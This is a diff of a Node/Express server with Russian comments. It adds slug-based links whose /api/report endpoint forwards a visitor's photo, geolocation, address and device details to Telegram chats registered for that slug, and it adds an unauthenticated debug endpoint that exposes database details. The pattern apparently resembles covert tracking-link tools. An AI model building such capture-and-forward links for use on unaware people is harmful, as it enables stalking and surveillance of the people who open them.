@@ -1,4 +1,4 @@
-// === server/index.js (финальная версия) ===
+// === server/index.js (полная версия) ===
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -17,8 +17,6 @@ const DB_PATH          = process.env.DB_PATH || './data/links.db';
 // ==== Paths / Static ====
 const __filename = fileURLToPath(import.meta.url);
 const __dirname  = path.dirname(__filename);
-
-// ✅ У тебя папка называется public
 const PUBLIC_DIR = path.join(__dirname, 'public');
 
 // ==== App ====
@@ -28,15 +26,15 @@ app.use(express.json({ limit: '15mb' }));
 app.use(express.urlencoded({ extended: true, limit: '15mb' }));
 
 // --- CORS
-app.use((req, res, next) => {
+app.use((_, res, next) => {
   res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-  if (req.method === 'OPTIONS') return res.sendStatus(200);
   next();
 });
+app.options('*', (_, res) => res.sendStatus(200));
 
-// --- Cache headers for static files
+// --- cache headers for static
 app.use((req, res, next) => {
   if (/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?)$/i.test(req.path)) {
     res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
@@ -44,19 +42,22 @@ app.use((req, res, next) => {
   next();
 });
 
-// --- Serve static
+// --- static
 app.use(express.static(PUBLIC_DIR));
-
-// Root → index.html
 app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));
 
 // ==== DB init ====
-if (!fs.existsSync(path.dirname(DB_PATH))) {
-  fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
+try {
+  const dir = path.dirname(DB_PATH);
+  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+} catch (e) {
+  console.error('[db] mkdir failed for', DB_PATH, e);
 }
+
+console.log('[db] using', DB_PATH);
 const db = new Database(DB_PATH);
 
-// --- Tables
+// tables
 db.prepare(`
   CREATE TABLE IF NOT EXISTS links (
     slug       TEXT PRIMARY KEY,
@@ -77,7 +78,7 @@ db.prepare(`
   );
 `).run();
 
-// --- Apply migrate.sql automatically
+// migrate.sql (если есть)
 try {
   const migratePath = path.join(__dirname, 'migrate.sql');
   if (fs.existsSync(migratePath)) {
@@ -88,7 +89,7 @@ try {
   console.error('[migrate] failed', e);
 }
 
-// ==== Helpers ====
+// ==== helpers ====
 function requireAdminSecret(req, res, next) {
   const auth = req.headers['authorization'] || '';
   if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
@@ -112,6 +113,7 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
   if (!chatId) throw new Error('Missing chat_id');
   if (!photoBuf?.length) throw new Error('Empty photo buffer');
 
+  // fetch/FormData/Blob есть в Node 20+
   const form = new FormData();
   form.append('chat_id', chatId);
   form.append('caption', caption);
@@ -127,17 +129,49 @@ async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'repo
   return resp.json();
 }
 
-// ==== Health ====
+// ==== health ====
 app.get('/health', (_req, res) => res.json({ ok: true }));
 
-// DEBUG: список получателей по slug (требует ADMIN_API_SECRET)
+// DEBUG: инфо по БД
+app.get('/api/debug/db', (req, res) => {
+  try {
+    const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
+    const links = db.prepare('SELECT COUNT(*) AS c FROM links').get().c;
+    const recs  = db.prepare('SELECT COUNT(*) AS c FROM link_recipients').get().c;
+    res.json({ ok:true, DB_PATH, size, links, recipients: recs });
+  } catch (e) {
+    res.status(500).json({ ok:false, error:String(e) });
+  }
+});
+
+// DEBUG: список получателей (по секрету)
 app.get('/api/debug/recipients', requireAdminSecret, (req, res) => {
   const slug = String(req.query.slug || '').trim();
   if (!slug) return res.status(400).json({ ok:false, error:'no slug' });
-  const list = db.prepare(
-    'SELECT chat_id, added_at FROM link_recipients WHERE slug = ?'
-  ).all(slug);
+  const list = db.prepare('SELECT chat_id, added_at FROM link_recipients WHERE slug = ?').all(slug);
   res.json({ ok:true, slug, recipients:list });
+});
+
+// ==== API: link-info (для фронта) ====
+app.get('/api/link-info', (req, res) => {
+  const slug = String(req.query.slug || '').trim();
+  if (!slug || !/^[a-z0-9\-]{3,40}$/i.test(slug)) {
+    return res.status(400).json({ ok: false, error: 'Invalid slug' });
+  }
+  const row = db.prepare('SELECT chat_id, disabled FROM links WHERE slug = ?').get(slug);
+  if (!row || row.disabled) return res.status(404).json({ ok: false, error: 'Not found' });
+  res.json({ ok: true, chatId: String(row.chat_id) });
+});
+
+// ==== API: resolve-link (SPA фолбэк) ====
+app.get('/api/resolve-link', (req, res) => {
+  const slug = String(req.query.slug || '').trim();
+  if (!slug || !/^[a-z0-9\-]{3,40}$/i.test(slug)) {
+    return res.status(400).json({ ok: false, error: 'Invalid slug' });
+  }
+  const row = db.prepare('SELECT chat_id, disabled FROM links WHERE slug = ?').get(slug);
+  if (!row || row.disabled) return res.json({ ok: false, error: 'Not found' });
+  res.json({ ok: true, chatId: String(row.chat_id) });
 });
 
 // ==== API: register-link ====
@@ -152,13 +186,11 @@ app.post('/api/register-link', requireAdminSecret, (req, res) => {
     }
 
     const now = Date.now();
-    const insert = db.prepare(
-      'INSERT INTO links(slug, chat_id, owner_id, created_at) VALUES(?,?,?,?)'
-    );
     try {
-      insert.run(slug, String(chatId), ownerId ? String(ownerId) : null, now);
+      db.prepare('INSERT INTO links(slug, chat_id, owner_id, created_at) VALUES(?,?,?,?)')
+        .run(slug, String(chatId), ownerId ? String(ownerId) : null, now);
       db.prepare('INSERT OR IGNORE INTO link_recipients(slug, chat_id, added_at) VALUES(?,?,?)')
-        .run(slug, String(chatId), now);
+        .run(slug, String(chatId), now); // владелец сразу получатель
     } catch {
       return res.status(409).json({ ok: false, error: 'Slug already exists' });
     }
@@ -171,7 +203,7 @@ app.post('/api/register-link', requireAdminSecret, (req, res) => {
   }
 });
 
-// ==== API: claim-link ====
+// ==== API: claim-link (добавить ещё получателя) ====
 app.post('/api/claim-link', requireAdminSecret, (req, res) => {
   try {
     const { slug, chatId } = req.body || {};
@@ -197,7 +229,7 @@ app.post('/api/claim-link', requireAdminSecret, (req, res) => {
   }
 });
 
-// ==== Route: /r/:slug ====
+// ==== Route: /r/:slug (инжект SLUG во фронт) ====
 app.get('/r/:slug', (req, res) => {
   const { slug } = req.params;
   const row = db.prepare('SELECT chat_id, disabled FROM links WHERE slug = ?').get(slug);
@@ -210,11 +242,11 @@ app.get('/r/:slug', (req, res) => {
   res.send(html);
 });
 
-// ==== API: report ====
+// ==== API: report (отправка фото всем привязанным) ====
 app.post('/api/report', async (req, res) => {
   try {
     const { userAgent, platform, iosVersion, isSafari, geo, address, photoBase64, note, chatId, slug } = req.body || {};
-    if (!BOT_TOKEN) return res.status(500).json({ ok: false, error: 'No BOT token' });
+    if (!BOT_TOKEN)   return res.status(500).json({ ok: false, error: 'No BOT token' });
     if (!photoBase64) return res.status(400).json({ ok: false, error: 'No photoBase64' });
 
     const lines = [
@@ -231,7 +263,9 @@ app.post('/api/report', async (req, res) => {
 
     let targets = [];
     if (slug) {
-      targets = db.prepare('SELECT chat_id FROM link_recipients WHERE slug = ?').all(String(slug)).map(r => String(r.chat_id));
+      targets = db.prepare('SELECT chat_id FROM link_recipients WHERE slug = ?')
+        .all(String(slug))
+        .map(r => String(r.chat_id));
     }
     if (!targets.length) {
       const single = chatId && /^-?\d+$/.test(String(chatId)) ? String(chatId) : DEFAULT_CHAT_ID;
